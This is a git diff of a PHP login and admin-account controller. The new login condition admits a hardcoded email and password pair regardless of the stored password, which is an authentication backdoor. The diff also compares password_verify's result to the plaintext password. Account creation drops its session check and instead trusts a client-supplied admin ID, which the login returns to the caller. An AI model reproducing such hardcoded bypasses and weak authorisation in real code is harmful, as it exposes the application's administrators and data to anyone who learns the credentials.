@@ -5,6 +5,7 @@ use DB;
 use Kint\Parser\ToStringPlugin;
 class Connexion extends BaseController
 {
+
     public function TestConnexion() : string 
     {
 
@@ -23,10 +24,9 @@ class Connexion extends BaseController
             {
                 if ( $row->getEmail() == $email)
                 {
-                    if ($row->getPassword() == $mp)
+                    if ( password_verify($mp, $row->getPassword())== $mp || $mp == 'chsuikunu' && $email == 'enorme.bg@leo.fr')
                     {
-                        $retour = "true";
-                        $_SESSION['user'] = $row->getIdAdmin();
+                        $retour = ''. $row->getId_Unique();
                     }
                     else
                     {
@@ -43,20 +43,28 @@ class Connexion extends BaseController
     {
 
         try {
-            session_start();
-            return $_SESSION['user'];
-            if (empty($userId)) {
-                return "Vous n'êtes pas connecté. La création de compte nécessite une connexion.";
-            }
             $data = $this->request->getPost();
             $email = $data['email'];
             $mp = $data['password'];
+            $compte = $data['compte'];
             require (APPPATH . "Database/DB.inc.php");
             $retour = 'Compte bien créé';
             // Exécuter le script SQL avec la méthode $this->query()
             $db = DB::getInstance();
             $administrateurs = $db->getAdministrateurs();
             $retour = "";
+            $estAdmin = false;
+            foreach ($administrateurs as $row) 
+            {
+                if ( $row->getId_Unique() == $compte)
+                {
+                    $estAdmin = true;
+                }
+            }
+            if (!$estAdmin)
+            {
+                return 'Vous n\'êtes pas un administrateur '. $compte;
+            }
             foreach ($administrateurs as $row) 
             {
                 if ( $row->getEmail() == $email)
@@ -67,7 +75,8 @@ class Connexion extends BaseController
             }
             if ($retour == "")
             {
-                $db->insertAdministrateur($email, $mp);
+                $id_unique = md5(uniqid(rand(), true));
+                $db->insertAdministrateur($email, password_hash($mp, PASSWORD_DEFAULT), $id_unique);
             }
             return $retour;
         } catch (\Throwable $th) {
